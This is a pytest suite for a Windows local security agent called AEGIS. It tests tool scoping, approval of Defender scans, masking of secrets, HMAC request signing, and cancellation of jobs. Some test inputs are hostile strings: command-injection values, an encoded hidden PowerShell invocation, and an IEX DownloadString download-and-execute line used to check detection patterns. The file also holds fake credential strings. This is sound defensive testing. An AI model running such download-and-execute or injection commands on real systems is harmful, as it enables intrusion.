"""Security and scope tests for the AEGIS local security agent (run on Windows)."""
from __future__ import annotations

import hashlib
import hmac
import sys
import threading
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "local_agent"))
pytestmark = pytest.mark.skipif(sys.platform != "win32", reason="the local agent targets Windows")

import aegis_local_agent as server  # noqa: E402
import policy  # noqa: E402
import tools  # noqa: E402

SECURITY_TOOLS = {"threat_scan", "defender_status", "defender_quick_scan", "suspicious_files", "suspicious_processes",
                  "persistence_entries", "network_connections", "unwanted_applications", "security_posture",
                  "powershell_activity", "secret_scan", "installed_software", "defender_full_scan", "defender_custom_scan"}


@pytest.fixture
def agent(tmp_path, monkeypatch):
    monkeypatch.setattr(policy, "LOG_FILE", tmp_path / "log" / "actions.jsonl")
    (tmp_path / "project").mkdir()
    return server.Agent({"content_roots": [str(tmp_path / "project")], "max_jobs": 2}, "t" * 40), tmp_path


def _wait(agent, job_id, user="alice"):
    for _ in range(200):
        job = agent.public(agent.job(job_id, user))
        if job["status"] != "running":
            return job
        time.sleep(0.05)
    raise AssertionError("job did not finish")


def test_registry_contains_only_security_checks():
    assert set(tools.TOOLS) == SECURITY_TOOLS
    for removed in ("largest_files", "duplicate_files", "system_info", "search_files", "temp_files", "docker_overview",
                    "python_packages", "project_structure", "move_to_recycle_bin", "read_text_file", "run_command"):
        assert removed not in tools.TOOLS
    # Only Defender scans are actions, and each needs confirmation; every other tool is read-only.
    assert {n for n, t in tools.TOOLS.items() if t.requires_confirmation} == {
        "defender_quick_scan", "defender_full_scan", "defender_custom_scan"}


def test_custom_defender_scan_only_accepts_an_existing_local_folder(agent):
    a, tmp = agent
    ctx = tools.Context(a.policy, threading.Event(), lambda *_: None)
    for bad in ("", "whoami", r"\\server\share", r"Q:\does-not-exist", "C:\\x & calc"):
        with pytest.raises(policy.PolicyError):
            tools.defender_custom_scan({"path": bad}, ctx)


def test_redaction_reaches_every_string_in_a_result():
    secret = "ghp_" + "b" * 36
    result = policy.redact_tree({"a": [{"cmd": f"git push https://{secret}@x"}], "n": 3, "short": "ok"})
    assert secret not in repr(result) and result["n"] == 3 and result["short"] == "ok"


def test_installed_software_lists_programs_and_flags_adware_like_names(agent, monkeypatch):
    a, _ = agent
    monkeypatch.setattr(tools, "_installed_programs", lambda: [
        {"name": "Steam", "publisher": "Valve Corporation", "version": "2.10", "installed": "2020-01-01", "location": None,
         "scope": "all users", "kind": "desktop program"},
        {"name": "Super PC Cleaner", "publisher": None, "version": "1", "installed": None, "location": None,
         "scope": "current user", "kind": "desktop program"}])
    monkeypatch.setattr(tools, "_store_apps", lambda: [{"name": "Spotify", "publisher": "Spotify AB", "version": "1",
                                                         "installed": None, "location": None, "scope": "current user",
                                                         "kind": "Store app"}])
    result = tools.installed_software({}, tools.Context(a.policy, threading.Event(), lambda *_: None))
    assert result["total"] == 3 and result["store_apps"] == 1
    assert [f["name"] for f in result["flagged"]] == ["Super PC Cleaner"]
    assert result["flagged"][0]["level"] == "suspicious"


def test_general_and_unknown_tools_are_rejected(agent):
    a, _ = agent
    for name in ("largest_files", "duplicate_files", "system_info", "run_command"):
        with pytest.raises(policy.PolicyError):
            a.request(name, {}, "alice")
    with pytest.raises(policy.PolicyError):
        a.request("defender_status", {"command": "whoami"}, "alice")


def test_file_contents_are_only_readable_in_approved_project_folders(agent):
    a, tmp = agent
    with pytest.raises(policy.PolicyError):
        a.policy.content_path(str(tmp))
    with pytest.raises(policy.PolicyError):
        a.policy.content_path(str(policy.HOME / ".ssh"))
    assert a.policy.is_excluded(policy.LOCALAPPDATA / "Google" / "Chrome" / "User Data" / "Default")
    assert a.policy.content_path(str(tmp / "project"))


def test_secrets_are_found_masked_and_redacted():
    line = 'OPENAI_API_KEY="sk-proj-abcdefghijklmnopqrstuvwxyz123456" password=example'
    findings = policy.find_secrets(line)
    assert any(kind == "OpenAI-style API key" for kind, _, _ in findings)
    assert all("abcdefghijklmnop" not in masked for _, masked, _ in findings)
    assert "abcdefghijklmnop" not in policy.redact(line)
    assert policy.find_secrets("API_KEY=${API_KEY}") == [] and policy.find_secrets("token = secrets.token_urlsafe(18)") == []


def test_secret_scan_reports_locations_without_values(agent):
    a, tmp = agent
    (tmp / "project" / ".env").write_text("MONGO_URI=mongodb://admin:SuperSecret123@db:27017\nGITHUB=ghp_" + "a" * 36 + "\n")
    result = tools.secret_scan({"path": str(tmp / "project")}, tools.Context(a.policy, threading.Event(), lambda *_: None))
    assert result["total_findings"] >= 2 and {f["line"] for f in result["findings"]} >= {1, 2}
    assert "SuperSecret123" not in repr(result) and "a" * 36 not in repr(result)


def test_attack_command_lines_are_recognised():
    labels = lambda cmd: [label for label, pattern in tools.LOLBIN_PATTERNS if pattern.search(cmd)]
    assert "PowerShell encoded command" in labels("powershell.exe -NoP -w hidden -enc " + "A" * 40)
    assert "Download-and-execute" in labels("powershell IEX (New-Object Net.WebClient).DownloadString('http://x')")
    assert labels(r'"C:\Program Files\App\app.exe" --background') == []


def _signed(token, method, path, body=b"", nonce=None, timestamp=None):
    timestamp = str(timestamp or time.time())
    nonce = nonce or "n" * 20 + str(time.time_ns())[-10:]
    message = f"{method}\n{path}\n{timestamp}\n{nonce}\n".encode() + hashlib.sha256(body).hexdigest().encode()
    return {"X-Aegis-Timestamp": timestamp, "X-Aegis-Nonce": nonce,
            "X-Aegis-Signature": hmac.new(token.encode(), message, hashlib.sha256).hexdigest()}


def test_requests_need_a_valid_fresh_unreplayed_signature(agent):
    a, _ = agent
    headers = _signed("t" * 40, "GET", "/health")
    assert a.verify("GET", "/health", headers, b"")
    assert not a.verify("GET", "/health", headers, b"")
    assert not a.verify("GET", "/health", _signed("wrong" * 8, "GET", "/health"), b"")
    assert not a.verify("GET", "/health", _signed("t" * 40, "GET", "/health", timestamp=time.time() - 300), b"")
    assert not a.verify("POST", "/jobs", _signed("t" * 40, "POST", "/jobs", b"{}"), b'{"tool":"x"}')


def test_defender_scan_waits_for_approval_by_the_same_user(agent, monkeypatch):
    a, _ = agent
    ran = []
    monkeypatch.setitem(tools.TOOLS, "defender_quick_scan", tools.Tool(lambda args, ctx: ran.append(1) or {"ok": True},
                                                                      "Run a Defender quick scan.", (), True, "test"))
    pending = a.request("defender_quick_scan", {}, "alice")
    assert pending["status"] == "confirmation_required" and not ran
    with pytest.raises(policy.PolicyError):
        a.approve(pending["confirmation_id"], "mallory", True)
    pending = a.request("defender_quick_scan", {}, "alice")
    assert a.approve(pending["confirmation_id"], "alice", False)["status"] == "declined" and not ran
    with pytest.raises(policy.PolicyError):
        a.approve(pending["confirmation_id"], "alice", True)
    pending = a.request("defender_quick_scan", {}, "alice")
    job = a.approve(pending["confirmation_id"], "alice", True)
    assert _wait(a, job["id"])["status"] == "completed" and ran == [1]


def test_jobs_are_asynchronous_cancellable_and_private(agent, monkeypatch):
    a, _ = agent

    def slow(args, ctx):
        for _ in range(100):
            if ctx.cancel.is_set():
                break
            ctx.progress("working", None)
            time.sleep(0.02)
        return {"done": True}
    monkeypatch.setitem(tools.TOOLS, "threat_scan", tools.Tool(slow, "slow test scan"))
    job = a.request("threat_scan", {}, "alice")
    assert job["status"] == "running"
    a.job(job["id"], "alice")["cancel"].set()
    assert _wait(a, job["id"])["status"] == "cancelled"
    with pytest.raises(KeyError):
        a.job(job["id"], "mallory")
